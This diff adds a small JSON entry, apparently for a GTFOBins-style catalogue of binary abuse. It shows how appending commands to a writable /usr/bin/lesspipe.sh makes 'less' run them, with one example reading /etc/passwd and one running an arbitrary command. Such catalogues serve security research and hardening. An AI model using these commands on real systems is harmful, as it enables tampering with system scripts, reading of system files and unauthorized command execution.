@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "description": "This can read files by modifying the system lesspipe script if writable.\n",
+        "code": "echo 'cat /etc/passwd' >> /usr/bin/lesspipe.sh\nless anyfile\n"
+      }
+    ],
+    "command": [
+      {
+        "description": "This executes commands if the lesspipe script is writable.\n",
+        "code": "echo 'COMMAND' >> /usr/bin/lesspipe.sh\nless anyfile\n"
+      }
+    ]
+  }
+}
